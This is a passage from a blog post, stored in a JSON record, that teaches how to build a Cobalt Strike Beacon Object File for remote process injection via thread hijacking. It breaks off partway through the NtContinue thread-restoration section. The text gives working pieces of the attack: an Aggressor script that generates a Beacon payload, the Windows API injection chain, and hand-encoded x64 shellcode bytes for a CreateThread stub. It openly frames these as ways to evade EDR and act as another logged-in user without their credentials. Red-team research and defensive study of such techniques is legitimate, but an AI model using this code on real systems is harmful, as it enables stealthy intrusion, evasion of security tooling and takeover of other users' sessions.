{
    "id": "550253aa-7d0b-46d9-9599-519b3055c409",
    "created_at": "2023-01-12T15:06:01.47514Z",
    "updated_at": "2025-03-27T02:09:17.986167Z",
    "deleted_at": null,
    "sha1_hash": "50a1f68891aa9e9462667cc8b95fda0043c8164d",
    "title": "2021-01-09 - Malware Development- Leveraging Beacon Object Files for Remote Process Injection via Thread Hijacking",
    "authors": "",
    "file_creation_date": "2022-05-28T15:49:47Z",
    "file_modification_date": "2022-05-28T15:49:47Z",
    "file_size": 1260817,
    "plain_text": "# Malware Development: Leveraging Beacon Object Files for Remote Process Injection via Thread Hijacking\n\n**connormcgarr.github.io/thread-hijacking/**\n\nJanuary 9, 2021\n\n### Connor McGarr\n\nSoftware Engineer @ CrowdStrike | Exploit Development and Vulnerability Research\n\n47 minute read\n\n## Introduction\n\nAs people I have interacted with will attest, my favorite subject in the entire world is binary\nexploitation. I love everything about it, from the problem solving aspects to the OS internals,\nassembly, and C side of the house. I also enjoy pushing my limits in order to find new and\ncreative solutions for exploitation. In addition to my affinity for exploitation, I also love to red\nteam. After all, this is what I do on a day to day basis. While I love to work my way around\nenterprise networks, I find myself really enjoying the host-based avoidance aspects of red\nteaming. I find it incredibly fun and challenging to use some of my prerequisite knowledge on\nexploitation and Windows internals in order to bypass security products and stay undetected\n(well, try to anyways). With Cobalt Strike, a very popular remote access tool (RAT), being so\n\n\n-----\n\nwidely adopted by red teams - I thought I would investigate deeper into a newer Cobalt Strike\ncapability, Beacon Object Files, which allow operators to write post-exploitation capabilities in\nC (which makes me incredibly happy as a person). This blog will go over a technique known\nas thread hijacking and integrating it into a usable Beacon Object File.\n\nHowever, before beginning, I would like to delineate this post will be focused on the\ntechnique of remote process injection, thread hijacking, and thread restoration - not so much\non Beacon Object Files themselves. Beacon Object Files, for our purposes, are a means to\nan end, as this technique can be deployed in many other fashions. As was aforementioned,\nCobalt Strike is widely adopted and I think it is a great tool and I am a big proponent of it. I\nstill believe at the end of the day, however, it is more important to understand the overarching\nconcept surrounding a TTP (Tactic, Technique, and Procedure), versus learning how to just\narbitrarily run a tool, which in turn will create a bottleneck in your red teaming methodology\nby relying on a tool itself. If Cobalt Strike went away tomorrow, that shouldn’t render this TTP,\nor any other TTPs, useless. However, almost contradictory, this first portion of this post will\nbriefly outline what Beacon Object Files are, a quick recap on remote process injection, and\na bit on writing code that adheres to the needs of Beacon Object Files.\n\n[Lastly, the final project can be found here.](https://github.com/connormcgarr/cThreadHijack)\n\n## Beacon Object Files - You have two minutes, go.\n\n[Back in June, I saw a very interesting blog post from Cobalt Strike that outlined a new](https://blog.cobaltstrike.com/2020/06/25/cobalt-strike-4-1-the-mark-of-injection/)\n[Beacon capability, known as Beacon Object Files. Beacon Object Files, stylized as BOFs,](https://www.cobaltstrike.com/help-beacon-object-files)\nare essentially compiled C programs that are executed as position-independent code within\nBeacon. You bring the object file and Cobalt Strike supplies the linking. Raphael Mudge, the\ncreator of Cobalt Strike, has a [YouTube video that goes over the intrinsics, capabilities, and](https://youtu.be/gfYswA_Ronw)\nlimitations of BOFs. I highly recommend you check out this video. In addition, I encourage\nyou to check out TrustedSec’s [BOF blog and project to supplement the available Cobalt](https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/)\nStrike documentation for BOF development.\n\nOne thing to note before moving on is that BOFs are intended to be “lightweight” tools.\nLightweight may be subjective, but as Raphael points out in his video and blog, the main\nbenefit of BOFs are twofold:\n\n1. BOFs do not spawn a temporary “sacrificial” process to perform post-exploitation work \nthey’re directly executed as position-independent code within the current Beacon\nprocess, increasing overall OPSEC (operational security).\n2. BOFs are really meant to interact with the Windows API and the internal Beacon API,\n\nas BOFs expose a set of functions operators can use when developing. This means\nBOFs are smaller in size and easily allow you to invoke Window APIs and interact with\nthe internal Beacon API.\n\nAdditionally, there are a few drawbacks to BOFs:\n\n\n-----\n\n1. Cobalt Strike is the linker for BOFs - meaning libc style functions like `strlen will not`\n\nresolve. To compensate for this, however, you can use BOF compliant decorators in\nyour function prototypes with the MSVCRT (Microsoft C Run-time) library and grab\nsuch functions from there. Declaring and using such functions with BOFs will be\noutlined in the latter portions of this post. Additionally, from Raphael’s CVE-2020-0796\nBOF, there are ways to define your own C-style functions.\n2. BOFs are executed within the current Beacon process - meaning that if your BOF\n\nencounters some kind of internal error and fails, your Beacon process will crash as\nwell. This means BOFs should be carefully vetted and tested across multiple systems,\nnetworks, and environments, while also implementing host-based checks for version\ninformation, using properly documented data types and structures outlined in a\nfunction’s prototype, and cleaning up any opened handles, allocated memory, etc.\n\nNow that that’s out of the way, let’s get into a bit of background on remote process injection\nand thread hijacking, as well as outline our BOF’s execution flow.\n\n## Remote Process Injection\n\nRemote process injection, for the unfamiliar, is a technique in which an operator can inject\ncode into another process on a machine, under certain circumstances. This is most\ncommonly done with a chain of Windows APIs being called in order to allocate some\nmemory in the other process, write user-defined memory (usually a shellcode of some sort)\nto that allocation, and kicking off execution by create a thread within the remote process. The\nAPIs, `VirtualAllocEx,` `WriteProcessMemory, and` `CreateRemoteThread are often`\npopular choices, respectively.\n\nWhy is remote process injection important? Take a look at the image below, which is a listing\nof processes performed inside of a Cobalt Strike Beacon implant.\n\n\n-----\n\nAs is seen above, Cobalt Strike not only discloses to the operator what processes are\nrunning, but also under what user context a certain process is running under. This could be\nvery useful on a penetration test in an Active Directory environment where the goal is to\nobtain domain administrative access. Let’s say you as an operator obtain access to a server\nwhere there are many users logged in, including a user with domain administrative access.\nThis means that there is a great likelihood there will be processes running in context of this\nhigh-value user. This concept can be seen below where a second process listing is\nperformed where another user, `ANOTHERUSER has a` `PowerShell.exe process running on`\nthe host.\n\nUsing Cobalt Strike’s built-in `inject capability, a raw Beacon implant can be injected into`\nthe `PowerShell.exe process utilizing the remote injection technique outlined in the Cobalt`\nStrike Malleable C2 profile, resulting in a second callback, in context of the `ANOTHERUSER`\nuser, using the PID of the `PowerShell.exe instance, process architecture (64-bit), and the`\nname of the Cobalt Strike listener as arguments.\n\n\n-----\n\nAfter the injection, there is a successful callback, resulting in a valid session in context of the\n```\nOTHERUSER user.\n\n```\nThis is useful to a red team operator, as the credentials for the `OTHERUSER were not needed`\nin order to obtain access in context of said user. However, there are a few drawbacks including the addition of endpoint detection and response (EDR) products that detect on\nsuch behavior. One of the indicators of compromise (IOC) would be, in this instance, a\nremote thread being created in a remote process. There are more IOCs for this TTP, but this\nblog will focus on circumventing the need to create a remote thread. Instead, let’s examine\nthread hijacking, a technique in which an already existing thread within the target process is\nsuspended and manipulated in order to execute shellcode.\n\n## Thread Hijacking and Thread Restoration\n\nAs mentioned earlier, the process for a typical remote injection is:\n\n1. Allocate a memory region within the target process using `VirtualAllocEx . A handle`\n\nto the target process must already be existing with an access right of at least\n```\n   PROCESS_VM_OPERATION in order to leverage this API successfully. This handle can\n\n```\nbe obtained using the Windows API function `OpenProcess .`\n2. Write your code to the allocated region using `WriteProcessMemory . A handle to the`\n\ntarget process must already be existing with an access right of at least\n```\n   PROCESS_WRITE and the previously mentioned PROCESS_VM_OPERATION - meaning a\n\n```\nhandle to the remote process must have both of these access rights at minimum to\nperform remote injection.\n3. Create a remote thread, within the remote process, to execute the shellcode, using\n```\n   CreateRemoteThread .\n\n```\nOur thread hijacking technique will utilize the first two members of the previous list, but\ninstead of `CreateRemoteThread, our workflow will consist of the following:`\n\n1. Open a handle to the remote process using the aforementioned access rights required\n\nby `VirtualAllocEx and` `WriteProcessMemory .`\n2. Loop through the threads on the machine utilizing the Windows API\n```\n   CreateToolhelp32Snapshot . This loop will contain logic to break upon identifying\n\n```\nthe first thread within the target process.\n3. Upon breaking the loop, open a handle to the target thread using the Windows API\n\nfunction `OpenThread .`\n\n\n-----\n\n4. Call `SuspendThread, passing the former thread handle mentioned as the argument.`\n```\n  SuspendThread requires the handle has an access right of\n  THREAD_SUSPEND_RESUME .\n\n```\n5. Call `GetThreadContext, using the thread handle. This function requires that handles`\n\nhave a `THREAD_GET_CONTEXT access right. This function will dump the current state`\nof the target thread’s CPU registers, processor flags, and other CPU information into a\n```\n  CONTEXT record. This is because each thread has its own stack, CPU registers, etc.\n\n```\nThis information will be later used to execute our shellcode and to restore the thread\nonce execution has completed.\n6. Inject the shellcode into the desired process using `VirtualAllocEx and`\n```\n  WriteProcessMemory . The shellcode that will be used in this blog will be the default\n\n```\nCobalt Strike payload, which is a reflective DLL. This payload will be dynamically\ngenerated with a user-specified listener that exists already, using a Cobalt Strike\nAggressor Script. Creation of the Aggressor Script will follow in the latter portions of\nthis blog post. The Beacon implant won’t be executed quite yet, it will just be sitting\nwithin the target remote process, for the time being.\n[7. Since Cobalt Strike’s default stageless payload is a reflective DLL, it works a bit](https://blog.cobaltstrike.com/2016/06/15/what-is-a-stageless-payload-artifact/)\n\ndifferently than traditional shellcode. Because it is a reflective DLL, when the `DllMain`\nfunction is called to kick off Beacon, the shellcode never performs a “return”, because\nBeacon calls either `ExitThread or` `ExitProcess to leave` `DllMain, depending on`\nwhat is specified in the payload by the operator. Because of this, it would not be\npossible to restore the hijacked thread, as the thread will run the `DllMain function`\nuntil the operator exits the Beacon, since the stageless raw Beacon artifact does not\nperform a “return”. Due to this, we must create a shellcode that our Beacon implant will\nbe wrapped in, with a custom `CreateThread routine that creates a local thread within`\nthe remote process for the Beacon implant to run. Essentially, this is one of three\ncomponents our “new” full payload will “carry”, so when execution reaches the remote\nprocess, the call to `CreaeteThread, which creates a local thread, will allocate the`\nthread in the remote process for Beacon to run in. This means that the hijacked thread\nwill never actually execute the Beacon implant, it will actually execute a small\nshellcode, made up of three components, that places the Beacon implant into its own\nlocal thread, along with a two other routines that will be described here shortly. Up until\nthis point, no code has been executed and everything mentioned is just a synopsis of\neach component’s purpose.\n\n\n-----\n\n8. The custom `CreateThread routine is actually executed by being called from another`\n\nroutine that will be wrapped into our final payload, which is a routine for a call to\n```\n   NtContinue . This is the second component of our custom shellcode. After the\n   CreateThread routine is finished executing, it will perform a return back into the\n   NtContinue routine. After the hijacked thread executes the CreateThread routine,\n\n```\nthe thread needs to be restored with the original CPU registers, flags, etc. it had before\nthe thread hijack occurred. `NtContinue will be talked about in the latter portions of`\nthis post, but for now just know that `NtContinue, at a high level, is a function in`\n```\n   ntdll.dll that accepts a pointer to a CONTEXT record and sets the calling thread to\n\n```\nthat context. Again, no code has been executed so far. The only thing that has changed\nis our large “final payload” has added another component to it, `NtContinue .`\n9. The `CreateThread routine is first prepended with a stack alignment routine, which`\n\nperforms bitwise AND with the stack pointer, to ensure a 16-byte alignment. Some\nfunction calls fail if they are not 16-byte aligned, and this ensures when the shellcode\nperforms a call to the `CreateThread routine, it is first 16-byte aligned.` `malloc is`\nthen invoked to create one giant buffer that all of these “moving parts” are added to.\n10. Now that there is one contiguous buffer for the final payload, using `VirtualAllocEx`\n\nand `WriteProcessMemory, again, the final payload, consisting of the three routines,`\nis injected into the remote process.\n11. Lastly, the previously captured `CONTEXT record is updated to point the` `DWORD.Rip`\n\nmember, which represents the value of the 64-bit instruction pointer, to the address of\nour full payload.\n12. `SetThreadContext is then called, which forces the target thread to be updated to`\n\npoint to the final payload, and `ResumeThread is used to queue our shellcode`\nexecution, by resuming the hijacked thread.\n\nBefore moving on, there are two things I would like to call out. The first is the call to\n```\nCreateThread . At first glance, this may seem like it is not a viable alternative to\nCreateRemoteThread directly. The benefit of the thread hijacking technique is that even\n\n```\nthough a thread is created, it is not created from a remote process, it is created locally. This\ndoes a few things, including avoiding the common API call chain of `VirtualAllocEx,`\n```\nWriteProcessMemory, and CreateRemoteThread and secondly, by blending in (a bit\n\n```\nmore) by calling `CreateThread, which is a less scrutinized API call. There are other IOCs`\nto detect this technique. However, I will leave that as an exercise to the reader :-).\n\nLet’s move on and start with come code.\n\n## Visual Studio + Beacon Object File Intrinsics\n\nFor this project, I will be using Visual Studio and the MSVC Compiler, `cl.exe . Feel free to`\nuse `mingw, as it can also produce BOFs. Let’s go over a few house rules for BOFs before`\nwe begin.\n\n\n-----\n\nIn order to compile a BOF on Visual Studio, open an `x64 Native Tools Command Prompt`\n```\nfor VS session and use the following command: cl /c /GS- INPUT.c /FoOUTPUT.o .\n\n```\nThis will compile the C program as an object file only and will not implement stack cookies,\ndue to the Cobalt Strike linker obviously not being able to locate the injected stack cookie\ncheck functions.\n\nIf you would like to call a Windows API function, BOFs require a `__declspec(dllimport)`\nkeyword, which is defined in `winnt.h as` `DECLSPEC_IMPORT . This indicates to the`\ncompiler that this function is found within a DLL, telling the compiler essentially “this function\nwill be resolved later” and as mentioned before, since Cobalt Strike is the linker, this is\nneeded to tell the compiler to let the linking come later. Since the linking will come later, this\nalso means a full function prototype must be supplied to the BOF. You can use Visual Studio\nto “peek” the prototype of a Windows API function. This will suffice in attributing the\n```\n__declspec(dllimport) keyword to our function prototypes, as the prototypes of most\n\n```\nWindows API functions contain a `#define directive with a definition of` `WINBASEAPI, or`\nsimilar, which already contains a `__declspec(dllimport) keyword. An example would be`\nthe prototype of the function `GetProcAddress, as seen below.`\n\nThis reveals the `__declspec(dllimport) keyword will be present when this BOF is`\ncompiled.\n\nArmed with this information, if an operator wanted to include the function `GetProcAddress`\nin their BOF, it would be outlined as such:\n```\nWINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);\n\n```\nThe value directly before the `$ represents the library the function is found in. The relocation`\ntable of the object file, which essentially contains pointers to the list of items the object file\nneeds addresses from, like functions other libraries or object files, will point to the prototyped\n```\nLIB$Function functions memory address. Cobalt Strike, acting as the linker and loader,\n\n```\nwill parse this table and update the relocation table of the object file, where applicable, with\nthe actual addresses of the user-defined Windows API functions, such as `GetProcAddress`\nin the above test case. This blob is then passed to Beacon as a code to be executed. Not\nreinventing the wheel here, Raphael outlines this all in his wonderful video.\n\n\n-----\n\nIn addition to this, I will hit on one last thing - and that is user-supplied arguments and\nreturning output back to the operator. Beacon exposes an internal API to BOFs, that are\n[outlined in the beacon.h header file, supplied by Cobalt Strike. For returning output back to](https://www.cobaltstrike.com/downloads/beacon.h)\nthe operator, the API `BeaconPrintf is exposed, and can return output over Beacon. This`\nAPI accepts a user-supplied string, as well as `#define directive in` `beacon.h, namely`\n```\nCALLBACK_OUTPUT and CALLBACK_ERROR . For instance, updating the operator with a\n\n```\nmessage would be implemented as such:\n```\nBeaconPrintf(CALLBACK_OUTPUT, \"[+] Hello World!\\n\");\n\n```\nFor accepting user supplied arguments, you’ll need to implement an Aggressor Script into\nyour project. The following will be the script used for this post.\n\n\n-----\n\n```\n# Setup cThreadHijack\nalias cThreadHijack {\n  # Alias for Beacon ID and args\n  local('$bid $listener $pid $payload');\n  # Set the number of arguments\n  ($bid, $pid, $listener) = @_;\n  # Determine the amount of arguments\n  if (size(@_) != 3)\n  {\n    berror($bid, \"Error! Please enter a valid listener and PID\");\n  return;\n  }\n  # Read in the BOF\n  $handle = openf(script_resource(\"cThreadHijack.o\"));\n  $data = readb($handle, -1);\n  closef($handle);\n  # Verify PID is an integer\n  if ((!-isnumber $pid) || (int($pid) <= 0))\n  {\n    berror($bid, \"Please enter a valid PID!\\n\");\n    return;\n  }\n  # Generate a new payload \n  $payload = payload_local($bid, $listener, \"x64\", \"thread\");\n  $handle1 = openf(\">out.bin\");\n  writeb($handle1, $data1);\n  closef($handle1);\n  # Pack the arguments\n  # 'b' is binary data and 'i' is an integer\n  $args = bof_pack($bid, \"ib\", $pid, $payload);\n  # Run the BOF\n  # go = Entry point of the BOF\n  beacon_inline_execute($bid, $data, \"go\", $args);\n}\n\n```\nThe goal is to be able to supply our BOF to Cobalt Strike, with the very original name\n```\ncThreadHijack, a PID for injection and the name of the Cobalt Strike listener. The first\nlocal statement sets up our variables, which include the ID of the Beacon executing the\n\n```\nBOF, listener name, the PID, and payload, which will be generated later. The `@_ statement`\nsets an array with the order our arguments will be supplied to the BOF, mean the command\nto use this BOF would be `cThreadHijack \"Name of listener\" PID . After, error`\nchecking is done to determine if 3 arguments have been supplied (two for the PID and\nlistener and the Beacon ID, the third argument, will be supplied to the BOF without us\nneeding to input anything). After the object file is read in and the PID is verified, the\n\n\n-----\n\nAggressor function `payload_local is used to generate a raw Cobalt Strike payload with`\nthe user-supplied listener name and an exit method. After this, the user-supplied argument\n```\n$pid is packed as an integer and the newly created $payload variable is packed as a\n\n```\nbinary value. Then, upon execution in Cobalt Strike, the alias `cThreadHijacked is`\nexecuted with the aforementioned arguments, using the function `go as the main entry`\npoint. This script must be loaded before executing the BOF.\n\nFrom the C code side, this is how it looks to set these arguments and define the functions\nneeded for thread hijacking.\n\nThe function `BeaconDataParse is first used, with a special` `datap structure, to obtain the`\nuser-supplied arguments. Then, the value `int pid is set to the user-supplied PID, while`\nthe `char* shellcode value is set to the Beacon implant, meaning everything is in place.`\nFinally, now that details on adhering to BOF’s rules while writing C is out of the way, let’s get\ninto the code.\n\n## Open, Enumerate, Suspend, Get, Inject, and Get Out!\n\n\n-----\n\nThe first step in thread hijacking is to first open a handle to the target process. As mentioned\nbefore, calls that utilize this handle, `VirtualAllocEx and` `WriteProcessMemory, must`\nhave a total access right of `PROCESS_VM_OPERATION and` `PROCESS_VM_WRITE . This can be`\ncorrelated to the following code.\n\nThis function accepts the user-supplied argument for a PID and returns a handle to it. After\nthe process handle is opened, the BOF starts enumerating threads using the API\n```\nCreateToolhelp32Snapshot . This routine is sent through a loop and “breaks” upon the\n\n```\nfirst thread of the target PID being reached. When this happens, a call to `OpenThread with`\nthe rights `THREAD_SUSPEND_RESUME,` `THREAD_SET_CONTEXT, and` `THREAD_GET_CONTEXT`\noccurs. This allows the program to suspend the thread, obtain the thread’s context, and set\nthe thread’s context.\n\n\n-----\n\nAt this point, the goal is to suspend the identified thread, in order to obtain its current\n```\nCONTEXT record and later set its context again.\n\n```\nOnce the thread has been suspended, the Beacon implant is remotely injected into the target\nprocess. This will not be the final payload the hijacked thread will execute, this is simply to\ninject the Beacon implant into the remote process in order to use this address later on in the\n```\nCreateThread routine.\n\n```\n\n-----\n\nNow that the remote thread is suspended and our Beacon implant shellcode is sitting within\nthe remote process address space, it is time to implement a `BYTE array that places the`\nBeacon implant in a thread and executes it.\n\n## Beacon - Stay Put!\n\nAs previously mentioned, the first goal will be to place the already injected Beacon implant\ninto its own thread. Currently, the implant is just sitting within the desired remote process and\nhas not executed. To do this, we will create a 64-byte `BYTE array that will contain the`\nnecessary opcodes to perform this task. Let’s take a look at the `CreateThread` function\nprototype.\n```\nHANDLE CreateThread(\n LPSECURITY_ATTRIBUTES  lpThreadAttributes,\n SIZE_T         dwStackSize,\n LPTHREAD_START_ROUTINE lpStartAddress,\n __drv_aliasesMem LPVOID lpParameter,\n DWORD          dwCreationFlags,\n LPDWORD         lpThreadId\n);\n\n```\nAs mentioned by Microsoft documentation, this function will create a thread to execute within\nthe virtual address space of the calling function. Since we will be injecting this routine into the\nremote process, when the routine executed, it will create a thread within the remote process.\nThis is beneficial to us, as `CreateThread creates a local thread - but since the routine will`\nbe executed inside of the remote process, it will spawn a local thread, instead of requiring us\nto create a thread, remotely, from our current process.\n\n\n-----\n\nThe function argument we will be worried about is `LPTHREAD_START_ROUTINE, which is`\nreally just a function pointer to whatever the thread will execute. In our case, this will be the\naddress of our previously injected Beacon implant. We already have this address, as\n```\nVirtualAllocEx has a return value of type LPVOID, which is a pointer to our shellcode.\n\n```\nLet’s get into the development of the routine.\n\nThe first step is to declare a `BYTE array of 64-bytes. 64-bytes was chosen, as it is divisible`\nby a QWORD, which is a 64-bit address. This is to ensure proper alignment, meaning 8\nQWORDS will be used for this routine - which keeps everything nice and aligned.\nAdditionally, we will declare an integer variable to use as a “counter” in order to make sure\nwe are placing our opcodes at the correct index within the `BYTE array.`\n```\nBYTE createThread[64] = { NULL };\nint z = 0;\n\n```\nSince we are working on a 64-bit system, we must adhere to the `__fastcall calling`\nconvention. This calling convention requires the first four integer arguments (floating-point\nvalues are passed in different registers) are passed in the `RCX,` `RDX,` `R8, and` `R9`\nregisters, respectively. However, the question remains - `CreateThread has a total of six`\nparameters, what do we do with the last two? With `__fastcall, the fifth and subsequent`\nparameters are located on the stack at an offset of `0x20 and every` `0x8 bytes`\nsubsequently. This means, for our purposes, the fifth parameter will be located at `RSP +`\n```\n0x20 and the sixth will be located at RSP + 0x28 . Here are the parameters used for our\n\n```\npurposes.\n\n1. `lpThreadAttributes will be set to` `NULL . Setting this value to` `NULL will ensure`\n\nthe thread handle isn’t inherited by child processes.\n2. `dwStackSize will be set to 0. Setting this parameter to 0 forces the thread to inherit`\n\nthe default stack size for the executable, which is fine for our purposes.\n3. `lpStartAddress, as previously mentioned, will be the address of our shellcode. This`\n\nparameter is a function pointer to be executed by the thread.\n4. `lpParameter will be set to` `NULL, as our thread does not need to inherit any`\n\nvariables.\n5. `dwCreationFlags will be set to 0, which informs the thread we would like to thread to`\n\nrun immediately after it is created. This will kick off our Beacon implant, after thread\ncreation.\n6. `lpThreadId will be set to` `NULL, which is of less importance to us - as this will not`\n\nreturn a thread ID to the `LPDWORD pointer parameter. Essentially, we could have`\npassed a legitimate pointer to a `DWORD and it would have been dynamically filled with`\nthe thread ID. However, this is not important for purpose of this post.\n\nThe first step is to place a value of `NULL, or 0, into the RCX register, for the`\n```\nlpThreadAttributes argument. To do this, we can use bitwise XOR.\n\n```\n\n-----\n\n```\n// xor rcx, rcx\ncreateThread[z++] = 0x48;\ncreateThread[z++] = 0x31;\ncreateThread[z++] = 0xc9;\n\n```\nThis performs bitwise XOR with the same two values (RCX), which results in 0 as bitwise\nXOR with two of the same values results in 0. The result is then placed in the RCX register.\nSynonymously, we can leverage the same property of XOR for the second parameter,\n```\ndwStackSize, which is also 0.\n// xor rdx, rdx\ncreateThread[z++] = 0x48;\ncreateThread[z++] = 0x31;\ncreateThread[z++] = 0xd2;\n\n```\nThe next step, is really the only parameter we need to specify a specific value for, which is\n```\nlpStartAddress . Before supplying this parameter, let’s take a quick look back at our first\n\n```\ninjection, which planted the Beacon implant into the desired remote process.\n\nThe above code returns the virtual memory address of our allocation into the variable\n```\nplaceRemotely . As can be seen, this return value is of the data type LPVOID, while the\nlpStartParameter argument takes a data type of LPTHREAD_START_ROUTINE, which is\n\n```\npretty similar with `LPVOID . However, for continuity sake, we will first type cast this allocation`\ninto an `LPTHREAD_START_ROUTINE function pointer.`\n```\n// Casting shellcode address to LPTHREAD_START_ROUTINE function pointer\nLPTHREAD_START_ROUTINE threadCast = (LPTHREAD_START_ROUTINE)placeRemotely;\n\n```\n\n-----\n\nIn order to place this value into the `BYTE array, we will need to use a function that can copy`\nthis address to the buffer, as the `BYTE array will only accept one byte at a time. There is a`\nlimitation however, as BOFs do not link C-Runtime functions such as `memcpy . We can`\novercome this by creating our own custom `memcpy routine, or grabbing one from the`\nMSVCRT library, which Cobalt Strike can link to us. However, for now and for awareness of\nothers, we will leverage a `libc.h header file that Raphael created, which can be found`\n[here.](https://github.com/rsmudge/CVE-2020-0796-BOF/blob/master/src/libc.c)\n\nUsing the custom `mycopy function, we can now perform a` `mov r8,`\n```\nLPTHREAD_START_ROUTINE instruction.\n// mov r8, LPTHREAD_START_ROUTINE\ncreateThread[z++] = 0x49;\ncreateThread[z++] = 0xb8;\nmycopy(createThread + z, &threadCast, sizeof(threadCast));\nz += sizeof(threadCast);\n\n```\n\n-----\n\nNotice how the end of this small shellcode blob contains an update for the array index\ncounter `z, to ensure as the array is written to at the correct index. We have the luxury of`\nusing a `mov r8, LPTHREAD_START_ROUTINE, as our shellcode pointer has already been`\nmapped into the remote process. This will allow the `CreateThread routine to find this`\nfunction pointer, in memory, as it is available within the remote process address space. We\nmust remember that each process on Windows has its own private virtual address space,\nmeaning memory in one user mode process isn’t visible to another user mode process. As\nwe will see with the `NtContinue stub coming up, we will actually have to embed the`\npreserved `CONTEXT record of the hijacked thread into the payload itself, as the structure is`\nlocated in the current process, while the code will be executing within the desired remote\nprocess.\n\nNow that the `lpStartAddress parameter has been completed,` `lpParameter must be set`\nto `NULL . Again, this can be done by utilizing bitwise XOR.`\n```\n// xor r9, r9\ncreateThread[z++] = 0x4d;\ncreateThread[z++] = 0x31;\ncreateThread[z++] = 0xc9;\n\n```\nThe last two parameters, `dwCreationFlags and` `lpThreadId will be located at an offset`\nof `0x20 and` `0x28, respectively, from RSP. Since R9 already contains a value of 0, and`\nsince both parameters need a value of 0, we can use to `mov instructions, as such.`\n```\n// mov [rsp+20h], r9 (which already contains 0)\ncreateThread[z++] = 0x4c;\ncreateThread[z++] = 0x89;\ncreateThread[z++] = 0x4c;\ncreateThread[z++] = 0x24;\ncreateThread[z++] = 0x20;\n// mov [rsp+28h], r9 (which already contains 0)\ncreateThread[z++] = 0x4c;\ncreateThread[z++] = 0x89;\ncreateThread[z++] = 0x4c;\ncreateThread[z++] = 0x24;\ncreateThread[z++] = 0x28;\n\n```\nA quick note - notice that the brackets surrounding each `[rsp+OFFSET] operand indicate`\nwe would like to overwrite what that value is pointing to.\n\nThe next goal is to resolve the address of `CreateThread . Even though we will be resolving`\nthis address within the BOF, meaning it will be resolved within the current process, not the\ndesired remote process, the address of `CreateThread will be the same across processes,`\nalthough each user mode process is mapped its own view of `kernel32.dll . To resolve`\nthis address, we will use the following routine, with BOF denotations in our code.\n\n\n-----\n\n```\n// Resolve the address of CreateThread\nunsigned long long createthreadAddress =\nKERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA(\"kernel32\"), \"CreateThread\");\n// Error handling\nif (createthreadAddress == NULL)\n{\n BeaconPrintf(CALLBACK_ERROR, \"Error! Unable to resolve CreateThread. Error:\n0x%lx\\n\", KERNEL32$GetLastError());\n}\n\n```\nThe `unsigned long long variable` `createthreadAddress will be filled with the address`\nof `CreateThread .` `unsigned long long is a 64-bit value, which is the size of a memory`\naddress on a 64-bit system. Although `KERNEL32$GetProcAddress has a prototype with a`\nreturn value of `FARPROC, we need the address to actually be of the type` `unsigned long`\n```\nlong, DWORD64, or similar, to allow us to properly copy this address into the routine with\nmycopy . The next goal is to move the address of CreateThread into RAX. After this, we\n\n```\nwill perform a `call rax instruction, which will kick off the routine. This can be seen below.`\n```\n// mov rax, CreateThread\ncreateThread[z++] = 0x48;\ncreateThread[z++] = 0xb8;\nmycopy(createThread + z, &createthreadAddress, sizeof(createthreadAddress));\nz += sizeof(createthreadAddress);\n// call rax (call CreateThread)\ncreateThread[z++] = 0xff;\ncreateThread[z++] = 0xd0;\n\n```\nAdditionally, we want to add a `ret opcode. The way our full payload will be setup is as`\nfollows:\n\n1. A call to the stack alignment/ CreateThread routine will be made firstly (the stack\n\nalignment routine will be hit on in a latter portion of this blog). When a `call`\ninstruction is executed, it pushes a return address onto the stack. This is the address\nthat `ret will jump to in order to continue execution of the payload. When the stack`\nalignment/ CreateThread routine is called, it will push a return address onto the stack.\nThis return address will actually be the address of the `NtContinue routine.`\n2. We want to end our stack alignment/ CreateThread routine with a `ret instruction.`\n\nThis `ret will force execution back to the` `NtContinue routine. This will all be`\noutlined when executed is examined inside of WinDbg.\n3. The call to the stack alignment/ CreateThread routine is actually going to be a part of\n\nthe `NtContinue routine. The first instruction in the` `NtContinue routine will be a call`\nto the stack alignment/ CreateThread shellcode, which will then perform a `ret back`\nto the `NtContinue routine, where thread execution will be restored. Here is a quick`\nvisual.\n\n\n-----\n\n```\nPAYLOAD = NtContinue shellcode calls stack alignment/CreateThread shellcode\n-> stack alignment/CreateThread shellcode executes, placing Beacon in its\nown local thread. This shellcode performs a return back to the NtContinue\nshellcode -> NtContinue shellcode finishes executing, which restores the\nthread\n\n```\nIn accordance with out plan, let’s end the `CreateThread routine with a` `0xc3 opcode,`\nwhich is a return instruction.\n```\n// Return to the caller in order to kick off NtContinue routine\ncreateThread[z++] = 0xc3;\n\n```\nLet’s continue by developing a `NtContinue shellcode routine. After that, we will develop a`\nstack alignment shellcode in order to ensure the stack pointer is 16-byte aligned, when the\nfirst call occurs in our final payload. Once we have completed both of these routines, we will\nwalk through the entire shellcode inside of the debugger.\n\n## “Never in the Field of Human Conflict, Was So Much Owed, by So Many, to NtContinue ”\n\nUp until now, we have achieved the following:\n\n1. Our shellcode has been injected into the remote process.\n2. We have identified a remote thread, which we will later manipulate to execute our\n\nBeacon implant\n3. We have created a routine that will place the Beacon implant in its own local thread,\n\nwithin the remote process, upon execution\n\nThis is great, and we are almost home free. The issue remains, however, the topic of thread\nrestoration. After all, we are taking a thread, which was performing some sort of action\nbefore, unbeknownst to us, and forcing it to do something else. This will certainly result in\nexecution of our shellcode, however, it will also present some unintended consequences.\nUpon executing our shellcode, the thread’s CPU registers, along with other information, will\nbe out of context from the actions it was performing before execution. This will cause the the\nprocess housing this thread, the desired remote process we are injecting into, to most likely\ncrash. To avoid this, we can utilize an undocumented `ntdll.dll function,` `NtContinue .`\nAs pointed out in Alex Ionescu and Yarden Shafir’s R.I.P ROP: CET Internals in Windows\n20H1 blog post, `NtContinue is used to resume execution after an exception or interrupt.`\nThis is perfect for our use case, as we can abuse this functionality. Since our thread will be\nmangled, calling this function with the preserved `CONTEXT record from earlier will restore`\nexecution properly. `NtContinue accepts a pointer to a` `CONTEXT record, and a parameter`\nthat allows a programmer to set if the Alerted state should be removed from the thread, as\n[outlined in its function prototype. We need not worry about the second parameter for our](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtContinue.html)\npurposes, as we will set this parameter to `FALSE . However, there remains the issue of the`\nfirst parameter, `PCONTEXT .`\n\n\n-----\n\nAs you can recall in the former portion of this blog post, we first preserved the `CONTEXT`\nrecord for our hijacked thread, within our BOF code. The issue we have, however, is that this\n```\nCONTEXT record is sitting within the current process, while our shellcode will be executed\n\n```\nwithin the desired remote process. Because of the fact each user mode process has its own\nprivate address space, this `CONTEXT 